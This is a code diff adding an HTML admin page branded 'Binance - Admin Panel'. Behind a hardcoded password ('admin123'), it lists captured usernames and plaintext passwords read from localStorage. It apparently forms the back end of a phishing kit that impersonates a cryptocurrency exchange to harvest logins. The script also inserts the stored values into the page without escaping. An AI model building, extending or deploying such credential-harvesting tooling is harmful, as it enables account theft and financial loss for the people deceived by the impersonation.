@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance - Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            min-height: 100vh;
+        }
+        .header {
+            background: #111;
+            padding: 20px;
+            border-bottom: 2px solid #d32f2f;
+            text-align: center;
+        }
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d32f2f;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 30px;
+        }
+        .auth-section {
+            background: #111;
+            padding: 40px;
+            border-radius: 8px;
+            border: 2px solid #d32f2f;
+            max-width: 500px;
+            margin: 0 auto 40px;
+        }
+        .auth-section h1 {
+            color: #d32f2f;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ccc;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: 1px solid #d32f2f;
+            border-radius: 5px;
+            color: white;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+        }
+        .auth-btn {
+            width: 100%;
+            padding: 12px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        .auth-btn:hover {
+            background: #b71c1c;
+        }
+        .message {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #ff6b6b;
+        }
+        .message.success {
+            color: #4caf50;
+        }
+        .admin-panel {
+            display: none;
+        }
+        .panel-title {
+            color: #d32f2f;
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .stat-card {
+            background: #111;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #d32f2f;
+            text-align: center;
+        }
+        .stat-card h3 {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .stat-card .number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #f3ba2f;
+        }
+        h2 {
+            color: #d32f2f;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #111;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        thead {
+            background: #222;
+        }
+        th {
+            padding: 15px;
+            text-align: left;
+            color: #d32f2f;
+            font-weight: bold;
+            border-bottom: 2px solid #d32f2f;
+        }
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #222;
+            color: #ccc;
+        }
+        tr:hover {
+            background: #1a1a1a;
+        }
+        .button-group {
+            text-align: center;
+        }
+        button.logout {
+            padding: 12px 30px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin: 10px;
+        }
+        button.logout:hover {
+            background: #b71c1c;
+        }
+        a {
+            color: #f3ba2f;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .empty-message {
+            text-align: center;
+            padding: 40px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-text">🔒 ADMIN PANEL</div>
+    </div>
+
+    <div class="container">
+        <!-- Authentication Section -->
+        <div id="authSection" class="auth-section">
+            <h1>Admin Access</h1>
+            <p style="text-align: center; color: #999; margin-bottom: 20px;">Enter admin password to access panel</p>
+            <form id="authForm">
+                <div class="form-group">
+                    <label for="adminPassword">Admin Password:</label>
+                    <input type="password" id="adminPassword" placeholder="Enter admin password" required>
+                </div>
+                <button type="submit" class="auth-btn">Login as Admin</button>
+                <div id="authMessage" class="message"></div>
+            </form>
+        </div>
+
+        <!-- Admin Panel Section -->
+        <div id="adminPanel" class="admin-panel">
+            <div class="panel-title">📊 Login Data Dashboard</div>
+
+            <div class="stats">
+                <div class="stat-card">
+                    <h3>Total Logins</h3>
+                    <div class="number" id="totalLogins">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Last Login</h3>
+                    <div class="number" id="lastLogin" style="font-size: 14px;">--</div>
+                </div>
+            </div>
+
+            <h2>All Login Records</h2>
+            <table id="loginsTable">
+                <thead>
+                    <tr>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Login Time</th>
+                    </tr>
+                </thead>
+                <tbody id="loginsBody">
+                    <tr>
+                        <td colspan="3" class="empty-message">No login records yet</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2>Actions</h2>
+            <div class="button-group">
+                <button class="logout" onclick="refreshData()">Refresh Data</button>
+                <button class="logout" onclick="clearAllData()">Clear All Data</button>
+                <button class="logout" onclick="logoutAdmin()">Logout</button>
+                <a href="index.html" style="display: inline-block; padding: 12px 30px; background: #f3ba2f; color: #000; border-radius: 8px; margin: 10px;">Back to Home</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Admin password (Change this to your desired password)
+        const ADMIN_PASSWORD = "admin123";
+        
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const password = document.getElementById('adminPassword').value;
+            const messageDiv = document.getElementById('authMessage');
+            
+            if (password === ADMIN_PASSWORD) {
+                messageDiv.textContent = 'Access granted!';
+                messageDiv.classList.add('success');
+                
+                setTimeout(() => {
+                    document.getElementById('authSection').style.display = 'none';
+                    document.getElementById('adminPanel').style.display = 'block';
+                    loadLoginData();
+                }, 500);
+            } else {
+                messageDiv.textContent = 'Invalid password!';
+                messageDiv.classList.remove('success');
+            }
+        });
+
+        function loadLoginData() {
+            // Retrieve all login data from localStorage
+            const allLogins = [];
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('login_')) {
+                    const data = JSON.parse(localStorage.getItem(key));
+                    allLogins.push(data);
+                }
+            }
+
+            // Display stats
+            document.getElementById('totalLogins').textContent = allLogins.length;
+            
+            if (allLogins.length > 0) {
+                document.getElementById('lastLogin').textContent = allLogins[allLogins.length - 1].time.split(',')[0];
+            }
+
+            // Display table
+            const tbody = document.getElementById('loginsBody');
+            tbody.innerHTML = '';
+
+            if (allLogins.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="empty-message">No login records yet</td></tr>';
+            } else {
+                allLogins.forEach((login, index) => {
+                    const row = tbody.insertRow();
+                    row.innerHTML = `
+                        <td>${login.username}</td>
+                        <td>${login.password}</td>
+                        <td>${login.time}</td>
+                    `;
+                });
+            }
+        }
+
+        function refreshData() {
+            loadLoginData();
+            alert('Data refreshed!');
+        }
+
+        function clearAllData() {
+            if (confirm('Are you sure? This will delete all login records.')) {
+                for (let i = localStorage.length - 1; i >= 0; i--) {
+                    const key = localStorage.key(i);
+                    if (key.startsWith('login_')) {
+                        localStorage.removeItem(key);
+                    }
+                }
+                loadLoginData();
+                alert('All data cleared!');
+            }
+        }
+
+        function logoutAdmin() {
+            document.getElementById('authSection').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('authForm').reset();
+        }
+    </script>
+</body>
+</html>
